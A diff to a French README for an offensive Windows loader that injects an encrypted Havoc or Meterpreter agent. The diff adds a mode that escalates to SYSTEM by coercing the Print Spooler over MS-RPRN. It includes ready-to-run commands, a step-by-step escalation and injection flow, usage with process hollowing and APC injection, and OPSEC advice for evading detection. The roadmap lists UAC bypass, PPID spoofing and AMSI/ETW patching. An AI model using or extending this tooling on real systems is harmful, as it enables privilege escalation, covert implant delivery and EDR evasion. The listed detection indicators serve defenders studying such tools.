@@ -19,6 +19,7 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 - [x] Meterpreter Reverse HTTPS Testing ✅ **VALIDATED**
 
 ### 🔄 Phase 2: OPSEC Enhancement (EN COURS)
+- [x] SeImpersonate Privilege Escalation (PrintSpoofer RPC intégré) ✅ **WORKING**
 - [ ] Polymorphic RC4 Decryption (Shoggoth-inspired)
 - [ ] Direct Syscalls (NtCreateProcess, NtWriteVirtualMemory, etc)
 - [ ] ETW Patching (EtwEventWrite + AMSI)
@@ -52,6 +53,7 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 | **APC Injection** | ✅ Working | 2025-12-30 |
 | **UAC Bypass** | ✅ Working | 2025-12-30 |
 | **PPID Spoofing** | ✅ Working | 2025-12-30 |
+| **SeImpersonate Escalation** | ✅ Working | 2026-01-17 |
 | **Meterpreter Integration** | ✅ Session Live | 2025-12-30 |
 | **String Encryption** | ✅ Verified | 2025-12-30 |
 | **Direct Syscalls** | 🔄 In Development | — |
@@ -69,6 +71,7 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 - 🔄 **Gestion des relocations** : Fixe automatiquement les adresses si ImageBase change
 - 👻 **PPID Spoofing** : Fait croire que le processus vient d'un parent différent
 - 🚀 **UAC Bypass** : Élévation de privilèges via fodhelper
+- ⚡ **SeImpersonate Escalation** : PrintSpoofer RPC intégré pour escalade SYSTEM automatique
 
 ## 📋 Usage Rapide
 
@@ -113,6 +116,35 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 .\loader.exe -m uac -v
 ```
 
+### Mode SeImpersonate - Escalation à SYSTEM via RPC Coercion (AUTO)
+```bash
+# Escalade à SYSTEM via Print Spooler RPC intégré, puis spawn svchost + APC
+.\loader.exe -i -v
+
+# Escalade à SYSTEM, puis HOLLOW un processus custom en tant que SYSTEM
+.\loader.exe -i -m hollow -f C:\Windows\System32\calc.exe -v
+
+# Escalade à SYSTEM, puis injecter via APC dans explorer en SYSTEM context
+.\loader.exe -i -m apc -p 1464 -v
+
+# Escalade à SYSTEM et spawn une commande directement en SYSTEM
+.\loader.exe -i -c "cmd.exe /c whoami > C:\temp\whoami.txt"
+```
+
+**Comment ça marche:**
+1. Crée un named pipe UUID: `\\.\pipe\{UUID}\pipe\spoolss`
+2. **Déclenche automatiquement RPC via MS-RPRN (PrintSpoofer intégré)**
+3. Attend que spoolsv.exe (SYSTEM) se connecte au named pipe
+4. Impersonne le token SYSTEM
+5. Relance le loader **sans le flag `-i`** en tant que SYSTEM (Session 1)
+6. Le loader relancé exécute l'injection normalement en contexte SYSTEM
+
+**Prérequis:**
+- Compte avec privilège SeImpersonate (NETWORK SERVICE, LOCAL SERVICE, IIS APPPOOL)
+- **Aucun outil externe requis** - PrintSpoofer RPC intégré au loader
+- Print Spooler service (spoolsv.exe) doit être démarré
+- Délai timeout: 25-35 secondes avec jitter
+
 ### Options Complètes
 ```
 -m, --mode MODE         hollow|apc|uac (défaut: none = DEFAULT mode)
@@ -120,7 +152,8 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 -f, --file PATH         Cible du hollowing (défaut: svchost.exe)
 -p, --pid PID           APC injection dans processus existant
 --ppid PPID             PPID spoofing (défaut parent)
--c, --cmd COMMAND       Commande custom pour UAC mode
+-i, --impersonate       Escalade à SYSTEM via SeImpersonate + RPC coercion
+-c, --cmd COMMAND       Commande custom pour UAC mode ou SeImpersonate
 -a, --anti              Anti-analysis checks (auto avec -v)
 -h, --help              Aide
 ```
@@ -239,6 +272,151 @@ Change le parent apparent d'un processus:
 - Hollowing uniquement (pas APC)
 - PID parent doit être valide
 
+## � SeImpersonate: Escalation à SYSTEM via RPC Coercion (MS-RPRN)
+
+### Architecture du Mécanisme
+
+**Le flag `-i` déclenche une escalade de privilèges en 5 étapes:**
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│ STEP 1: Named Pipe Creation (Service/NETWORK SERVICE context)  │
+├─────────────────────────────────────────────────────────────────┤
+│ • Génère UUID aléatoire                                         │
+│ • Crée pipe: \\.\pipe\{UUID}\pipe\spoolss                      │
+│ • Mode: DUPLEX | FILE_FLAG_OVERLAPPED                          │
+│ • Attend connexion (timeout: 25-35s avec jitter)               │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ STEP 2: RPC Coercion Trigger (INTÉGRÉ - Async Thread)          │
+├─────────────────────────────────────────────────────────────────┤
+│ • Thread asynchrone spawné automatiquement                      │
+│ • Appelle RpcOpenPrinter() sur hostname local                  │
+│ • Appelle RpcRemoteFindFirstPrinterChangeNotificationEx()      │
+│   avec CaptureServer: \\hostname/pipe/{UUID}                   │
+│ • Force spoolsv.exe (SYSTEM) à se connecter au named pipe      │
+│ • Utilise MIDL-generated MS-RPRN stubs (ms-rprn_c.c)          │
+│ • Binding RPC: ncacn_np (Named Pipe) vers \pipe\spoolss       │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ STEP 3: Token Impersonation (Named Pipe Acceptance)            │
+├─────────────────────────────────────────────────────────────────┤
+│ • ConnectNamedPipe() attend connexion en parallèle              │
+│ • ImpersonateNamedPipeClient() capture le contexte SYSTEM      │
+│ • DuplicateToken(Primary) → Token SYSTEM utilisable            │
+│ • Vérifie SID = S-1-5-18 (NT AUTHORITY\SYSTEM)                 │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ STEP 4: Process Relaunching (CreateProcessAsUserW)             │
+├─────────────────────────────────────────────────────────────────┤
+│ • Construit argv SANS le flag -i                               │
+│ • CreateProcessAsUserW(system_token, loader.exe -m hollow ...)│
+│ • New process: SYSTEM privileges + Session 1 (interactive)     │
+│ • Parent: Process original (NETWORK SERVICE ou autre)          │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ STEP 5: Normal Injection Execution                             │
+├─────────────────────────────────────────────────────────────────┤
+│ • Loader relancé exécute l'injection normalement               │
+│ • Tout se fait EN TANT QUE SYSTEM dans Session 1               │
+│ • Callback meterpreter: SYSTEM context + network access OK     │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### Flux d'Exécution Détaillé
+
+**Exemple: `.\loader.exe -i -m hollow -f calc.exe -v`**
+
+```
+┌──────────────────────────────────────────────────────────┐
+│ NETWORK SERVICE Context (original process)               │
+├──────────────────────────────────────────────────────────┤
+│ 1. Parser argv → use_impersonate=true, mode=HOLLOW       │
+│ 2. Condition: use_impersonate && !custom_command         │
+│    ✓ Déclenche relaunch pattern                          │
+│                                                          │
+│ 3. SeImpersonate escalation:                             │
+│    • CreateNamedPipe(UUID)                               │
+│    • Print "RPC trigger: SpoolSample.exe ..."           │
+│    • WaitForNamedPipe() bloque...                        │
+│    • [Waiting for 30 seconds...]                         │
+│                                                          │
+│ 4. RPC Connection Received:                              │
+│    • spoolsv.exe a connecté le pipe                      │
+│    • ImpersonateNamedPipeClient() → SYSTEM token         │
+│    • DuplicateTokenEx() → Primary token SYSTEM           │
+│    • Verify SID: S-1-5-18 ✓                              │
+│                                                          │
+│ 5. Rebuild Command Line:                                 │
+│    Original: loader.exe -i -m hollow -f calc.exe -v     │
+│    Rebuilt:  loader.exe -m hollow -f calc.exe -v        │
+│              (flag -i supprimé)                          │
+│                                                          │
+│ 6. CreateProcessAsUserW(system_token, rebuilt_cmd...)   │
+│    • Crée loader.exe relancé                             │
+│    • New PID: 3940 (SYSTEM, Session 1)                   │
+│    • Parent: NETWORK SERVICE process (1234)              │
+│    • Attend que child termine                            │
+│    • Return exit_code                                    │
+└──────────────────────────────────────────────────────────┘
+                          ↓↓↓
+┌──────────────────────────────────────────────────────────┐
+│ SYSTEM Context (relaunched process, Session 1)           │
+├──────────────────────────────────────────────────────────┤
+│ 1. Parser argv → use_impersonate=FALSE (flag retiré)     │
+│ 2. Skip relaunch pattern (pas de -i)                     │
+│ 3. HOLLOW Mode normal:                                   │
+│    • ProcessHollower::HollowProcess()                    │
+│    • Crée calc.exe suspendu                              │
+│    • Écriture des sections du payload                    │
+│    • Injection PE complète                               │
+│    • ResumeThread → Payload s'exécute                    │
+│                                                          │
+│ 4. Resultat:                                             │
+│    • calc.exe contient meterpreter                       │
+│    • Exécution: SYSTEM + Session 1                       │
+│    • Callback: ✅ SUCCESS (network access OK)           │
+└──────────────────────────────────────────────────────────┘
+```
+
+### Contexte d'Exécution par Mode
+
+| Mode | Sans `-i` | Avec `-i` |
+|------|-----------|-----------|
+| **DEFAULT** | spawn svchost (User) | spawn svchost (SYSTEM) |
+| **HOLLOW** | hollow cible (User) | hollow cible (SYSTEM) |
+| **APC -p <PID>** | APC dans PID as User | APC dans PID as SYSTEM¹ |
+| **Custom -c CMD** | execute CMD (User) | execute CMD (SYSTEM) |
+
+¹ **Important**: APC dans user process (explorer) = le code injecté s'exécute en tant qu'utilisateur, même si l'injection se fait depuis contexte SYSTEM
+
+### OPSEC et Indicateurs de Détection
+
+**✅ Bon OPSEC:**
+```
+• Pipe naming: UUID (pas "spoolss" en dur)
+• Timeouts: Jittered 25-35s (pas fixe)
+• Seul 1 appel ImpersonateNamedPipeClient
+• RPC source: Légitime (spoolsv.exe SYSTEM)
+• Pas d'énumération de services
+• Token primaire (pas duplication risquée)
+```
+
+**⚠️ Indicateurs de détection (EDR/SOC):**
+```
+• Création named pipe: \\.\pipe\*\pipe\spoolss
+• Attente de connexion nommée (25-35s timeout visible)
+• RPC inbound sur port 135/445 vers target
+• SpoolSample.exe exécuté sur attacker machine
+• CreateProcessAsUserW call (peu d'usage légitime)
+• Process parentage: service → explorer (anachronique)
+• ETW event: RPC call RpcOpenPrinter de spoolsv
+```
+
 ## 🚀 Cas d'Usage Typiques
 
 | Scénario | Commande | Résultat |
@@ -248,6 +426,8 @@ Change le parent apparent d'un processus:
 | **PPID spoofing** | `.\loader.exe -h --ppid 500` | Process tree falsifié |
 | **Injection existant** | `.\loader.exe -p 1464` | Auto-détecte PE/shellcode |
 | **UAC + Hollowing** | `.\loader.exe -u -v -h -f calc.exe` | Auto-élévation |
+| **SeImpersonate + HOLLOW** | `.\loader.exe -i -m hollow -f calc.exe -v` | Escalation SYSTEM + hollow calc |
+| **SeImpersonate + APC** | `.\loader.exe -i -m apc -p 1464 -v` | Escalation SYSTEM + inject explorer |
 | **Debug complet** | `.\loader.exe -v` | Logs PE, relocations, PEB |
 
 ## ⚠️ Restrictions & Limitations
